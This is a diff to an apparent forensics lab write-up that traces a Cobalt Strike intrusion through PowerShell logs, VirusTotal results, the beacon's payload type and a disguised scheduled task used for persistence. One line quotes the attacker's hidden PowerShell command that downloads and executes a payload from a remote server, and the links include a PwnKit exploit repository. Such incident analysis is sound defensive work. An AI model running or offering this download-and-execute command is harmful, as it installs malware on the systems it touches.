@@ -568,7 +568,6 @@ Malicious Powershell Script Execution:
 
 
 89. However we still did not find the command used by the threat actor to gain initial access, based on the cyber kill chain, this command should refer to the malware installation command. Anyway after parsed and reviewing the `Windows Powershell` event log using `EvtxEcmd.exe` and `Timeline Explorer`, finally found the command used by the threat actor to gained initial acccess (command provided inside the `policy.docm` file).
-90. Great! Now we know the command used by the threat actor's for initial access is --> `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:806/a'))`
 
 > TIMELINE EXPLORER OF ANALYZING Windows Powershell EVENT LOG
 
@@ -580,12 +579,16 @@ Malicious Powershell Script Execution:
 
 
 90. Awesome! We found the installation command of binary `a` which comes from the threat actor's server and the activity along with it's content indeed recorded at the pcap file. This command usage is for initial access to the victim's machine, which then later on backdoor created by installing another malware inside the victim's machine (the encoded base64 logic).
+91. Great! Now we know the command used by the threat actor's for initial access is --> `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:806/a'))`
 
 > 21ST QUESTION --> ANS: `trojan.cobaltstrike/beacon`
 
 ![image](https://github.com/user-attachments/assets/22e67f89-e4fa-48e2-9511-96c105bc6efc)
 
 
+92. Referring to the threat intelligence result (virus total), the popular threat label is --> `trojan.cobaltstrike/beacon`.
+
+![image](https://github.com/user-attachments/assets/5ae85673-95d7-4cd4-9b15-8becb5d7d3dd)
 
 
 > 22ND QUESTION --> ANS: `windows-beacon_http-reverse_http`
@@ -593,9 +596,38 @@ Malicious Powershell Script Execution:
 ![image](https://github.com/user-attachments/assets/a09f7537-4060-4c40-8680-8c4071229499)
 
 
+93. Beacon is the name for Cobalt Strike default payload used to create a connection to the victim's machine. Searching on the internet, found a python [script](https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py) which helps us to define the payload type of this beacon.
+
+![image](https://github.com/user-attachments/assets/aba2bba7-236d-4463-b396-43793e034ab2)
+
+
+> RESULT
+
+![image](https://github.com/user-attachments/assets/f3c5b8e7-a9ad-4ad5-9a41-722182fa2d6e)
+
+
+94. Great! Now we know the beacon type is --> `windows-beacon_http-reverse_http`.
+
+
 > 23RD QUESTION --> ANS: `WindowsUpdateCheck`
 
 ![image](https://github.com/user-attachments/assets/b360d8f3-01a6-433e-a51b-df1380e705bb)
+
+
+95. To obtain persistence, threat actor often using a scheduled task. To identify what new task created by the threat actor, we can check the **Tasks** directory.
+
+> Using FTK Imager to improve visibility
+
+![image](https://github.com/user-attachments/assets/a2683ca2-c727-4e2c-8391-44d7df0760eb)
+
+
+96. Noticed there is a regular file named `WindowsUpdateCheck`. It is uncommon for a windows update configuration file is stored under `system32` directory. A legitimate one should be stored under this path:
+
+```
+C:\Windows\System32\Tasks\Microsoft\Windows\WindowsUpdate
+```
+
+97. However let's inspect the file by exporting it
 
 
 ## IMPORTANT LINKS:
@@ -604,4 +636,5 @@ Malicious Powershell Script Execution:
 https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/
 https://github.com/ly4k/PwnKit
 https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
+https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py
 ```
